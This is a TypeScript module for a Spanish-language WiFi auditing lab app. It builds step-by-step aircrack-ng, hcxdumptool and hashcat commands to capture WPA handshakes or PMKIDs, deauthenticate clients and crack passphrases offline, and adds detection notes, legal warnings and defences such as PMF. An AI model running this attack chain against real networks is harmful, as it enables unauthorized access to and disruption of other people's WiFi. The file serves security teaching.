/* WiFi Attack Lab — constructor de comandos de auditoría 802.11 para TU laboratorio.
   Cada paso: comandos exactos, qué esperar en la salida, la trampa típica y
   cómo se DETECTA esa acción. ⚖ Auditar WiFi ajeno sin permiso es delito
   (acceso a sistemas informáticos) aunque sea "solo el vecino". */

export interface WifiLabConfig {
  iface: string
  bssid: string
  channel: string
  ssid: string
  wordlist: string
  clientMac: string
  hashcatMask: string
}

export interface WifiLabStep {
  id: string
  icon: string
  title: string
  why: string
  commands: string[]
  expect: string
  trap?: string
  detection: string
  needsConfig: boolean
}

export const WIFI_LAB_STEPS: WifiLabStep[] = [
  {
    id: 'monitor',
    icon: '📡',
    title: '1 · Modo monitor',
    why: 'Para ver y capturar tráfico 802.11 (no solo el de tu red) la interfaz debe ir en monitor. En Kali con drivers Atheros/RTL8187/Ralink es plug-and-play; con chipsets Broadcom es sufrimiento. El hardware importa MÁS que el software.',
    needsConfig: false,
    commands: [
      'sudo airmon-ng check kill          # mata procesos que interfieren (NetworkManager, wpa_supplicant)',
      'sudo airmon-ng start {IFACE}       # crea {IFACE}mon en modo monitor',
      'iw dev {IFACE}mon info             # verifica: type monitor + canal actual',
    ],
    expect: 'airmon-ng lista los cambios y crea la interfaz mon. iw debe mostrar "type monitor".',
    trap: 'En chipsets con firmware propietario el modo monitor puede existir "a medias": ves beacons pero no inyecta. Test de inyección: sudo aireplay-ng --test {IFACE}mon',
    detection: 'airmon-ng check kill mata NetworkManager: en un equipo gestionado el usuario lo nota al instante. En servers/VMs con passthrough de USB, el evento USB nuevo es el indicador.',
  },
  {
    id: 'scan',
    icon: '🔎',
    title: '2 · Descubrir redes',
    why: 'airodump escucha beacons (las redes se presentan solas ~10 veces/seg) y muestra clientes asociados por BSSID. Es pasivo: ninguna red detecta un escaneo.',
    needsConfig: false,
    commands: [
      'sudo airodump-ng {IFACE}mon                              # barrido general en 2.4 GHz',
      'sudo airodump-ng {IFACE}mon --band a                     # 5 GHz',
      '# apunta: BSSID, CH, ESSID, POWER, STATION (clientes asociados)',
    ],
    expect: 'Pantalla superior = APs (BSSID/CH/ESSID). Inferior = clientes (STATION) con el BSSID del AP al que están asociados.',
    trap: 'Sin antena decente verás la mitad. El POWER negativo es dBm: -30 fuerte, -80 apenas. Y las redes ocultas muestran "<length: X>" en ESSID: el tamaño del nombre se filtra igual.',
    detection: 'Nada: el escaneo pasivo es indetectable por diseño. Detectar "escaneo" solo es posible con sondeos activos (probe requests).',
  },
  {
    id: 'capture',
    icon: '🎯',
    title: '3 · Capturar el handshake',
    why: 'El handshake WPA (4-way) ocurre cuando un cliente se asocia. Lo capturas esperando, o lo FUERZAS forzando al cliente a reconectarse (paso siguiente). Necesitas: un cliente conectado y capture en el canal correcto.',
    needsConfig: true,
    commands: [
      'sudo airodump-ng {IFACE}mon -c {CH} --bssid {BSSID} -w captura-{SSID}   # -c canal fijo, -w escribe .cap',
      '# deja capturando; espera el handshake o fuerzalo con el paso de deauth',
      '# arriba a la derecha aparecerá: WPA handshake: {BSSID}',
    ],
    expect: 'La línea superior muestra el contador de beacons/#data. El handshake aparece en la esquina sup. derecha al capturarse (M1-M4 o M1-M3 basta para cracar).',
    trap: 'Sin clientes conectados no hay handshake posible. Y captura en el canal EXACTO: si saltas de canal, pierdes los M2/M3.',
    detection: 'El AP registra asociaciones normales: forzar reconexiones repetidas SÍ es anomalía (varios deauth + reasoc en segundos = WIPS alarmando).',
  },
  {
    id: 'deauth',
    icon: '💥',
    title: '4 · Deauth (didáctico, 1 paquete)',
    why: 'Envía un frame deauth SUPlantando al AP (inyección) para que el cliente se reconecte y suelte el handshake. Con PMF (802.11w) activo en el AP, el cliente lo IGNORA: es la defensa. Un solo paquete basta y es el mínimo ético en tu lab.',
    needsConfig: true,
    commands: [
      'sudo aireplay-ng --deauth 1 -a {BSSID} -c {CLIENT} {IFACE}mon',
      '# -a = AP (spoofeado), -c = cliente a desasociar',
      '# variación broadcast (desasocia a TODOS): quita -c — muchísimo más ruidoso',
      '# mdk4 {IFACE}mon d -B {BSSID} -n 1   # alternativa con count exacto',
    ],
    expect: 'aireplay confirma "X acknowledgements". El cliente se reconecta en 2-10 s y airodump pilla el handshake.',
    trap: 'Sin cliente conectado no pasa nada. Si el AP usa PMF (WPA3 obliga, WPA2 opcional), los deauth no llegan: el cliente las descarta. No lances deauth continuos ni contra redes ajenas: es interferencia ilegal incluso "de broma".',
    detection: 'WIPS (AirMagnet, Aruba WIPS) y muchos APs domésticos modernos detectan frames de gestión spoofeados y alertan. Con PMF activo, el evento es "deauth recibido con MIC inválido" — log directo del intento.',
  },
  {
    id: 'pmkid',
    icon: '🔑',
    title: '5 · PMKID (sin clientes, sin deauth)',
    why: 'El EAPOL M1 de muchos APs incluye el PMKID en el campo RSN: se captura al CONECTARSE al AP (o con hcxdumptx forzando la captura del M1). No necesita clientes ni deauth: la vía limpia si está disponible.',
    needsConfig: true,
    commands: [
      'sudo hcxdumptool -i {IFACE}mon --enable_status=1 -o pmkid.pcapng --filterlist_ap={BSSID} --filtermode=2',
      'hcxpcapngtool -o hash.22000 pmkid.pcapng',
      'cat hash.22000      # formato PMKID*BSSID*MAC*ESSID para hashcat -m 22000',
    ],
    expect: 'hcxdumptool muestra "PMKID: XXXXX" en amarillo si el AP lo expone. Si nunca sale, el AP no lo incluye: pasa al handshake clásico.',
    trap: 'hcxdumptool envía probe requests y asocia brevemente: NO es pasivo total. Y NO lo apuntes a redes ajenas: es interacción directa con su AP.',
    detection: 'Asociaciones sin completar desde MACs desconocidas + probe requests dirigidos: los APs corporativos lo loguean (y MFP lo dificulta).',
  },
  {
    id: 'crack',
    icon: '🔨',
    title: '6 · Crack (solo tu propio laboratorio)',
    why: 'El crack es offline contra el handshake: la seguridad de tu WPA es la entropía de tu contraseña, no el secreto del algoritmo. hashcat -m 22000 (handshake EAPOL+PMKID unificado) o aircrack-ng clásico.',
    needsConfig: true,
    commands: [
      '# hashcat (GPU): dict\nhashcat -m 22000 hash.22000 {WORDLIST}\n# hashcat (GPU): máscara\nhashcat -m 22000 hash.22000 -a 3 {MASK}\n\n# aircrack (CPU, para comparar):\naircrack-ng -w {WORDLIST} -b {BSSID} captura-{SSID}-01.cap',
      '# wordlists de laboratorio: /usr/share/wordlists/rockyou.txt',
      '# crgenerate tu propia wordlist dirigida: ve a Wordlist Builder de HackNexus',
    ],
    expect: 'hashcat muestra el progreso y elSpeed en H/s: con una GPU moderna, 10^5-10^6 intentos/s en WPA. Contraseñas <10 caracteres diccionario caen; 16+ aleatorios, no.',
    trap: 'El formato cambió: hashcat -m 2500 está deprecado, usa -m 22000 con hash.22000 de hcxpcapngtool. Y sin handshake completo (M1+M2 basta) no hay nada que cracar.',
    detection: 'El crack es offline e indetectable. La defensa REAL: passphrase de 16+ caracteres aleatorios (o SAE) — el resto son detalles.',
  },
  {
    id: 'restore',
    icon: '🧹',
    title: '7 · Restaurar el sistema',
    why: 'airmon-ng check kill dejó tu equipo sin gestión de red. El pentest termina cuando tu máquina vuelve a su estado normal.',
    needsConfig: false,
    commands: [
      'sudo airmon-ng stop {IFACE}mon',
      'sudo systemctl restart NetworkManager wpa_supplicant',
      'iw dev {IFACE} info           # de vuelta a type managed',
    ],
    expect: 'Interfaz gestionada de nuevo por NetworkManager y WiFi funcional.',
    detection: '—',
  },
]

export const renderCommands = (step: WifiLabStep, c: WifiLabConfig): string[] =>
  step.commands.map((cmd) =>
    cmd
      .replaceAll('{IFACE}mon', `${c.iface}mon`)
      .replaceAll('{IFACE}', c.iface)
      .replaceAll('{BSSID}', c.bssid || 'AA:BB:CC:DD:EE:FF')
      .replaceAll('{CH}', c.channel || '6')
      .replaceAll('{SSID}', c.ssid || 'MiLab')
      .replaceAll('{CLIENT}', c.clientMac || '11:22:33:44:55:66')
      .replaceAll('{WORDLIST}', c.wordlist || '/usr/share/wordlists/rockyou.txt')
      .replaceAll('{MASK}', c.hashcatMask || '?u?l?l?l?l?d?d?s'),
  )

export const WIFI_HARDWARE = [
  { chip: 'Atheros AR9271', tool: 'TP-Link TL-WN722N v1', monitor: '✅ completo', inject: '✅', note: 'EL clásico de los labs. Ojo: la v2 lleva otro chip y NO inyecta.' },
  { chip: 'Ralink RT3070', tool: 'Alfa AWUS036NHA', monitor: '✅ completo', inject: '✅', note: 'El favorito: USB externo, antena desmontable, dual en variantes.' },
  { chip: 'Realtek RTL8812AU', tool: 'Alfa AWUS036ACH', monitor: '✅ (driver extra)', inject: '✅', note: 'AC 1200 para 5 GHz: necesita instalar driver aircrack-ng-rtl8812au.' },
  { chip: 'Intel AX210', tool: 'portátiles modernos', monitor: '✅ parcial', inject: '⚠ limitado', note: 'Escaneo y captura OK; inyección penosa. Sirve para aprender, no para todo.' },
]
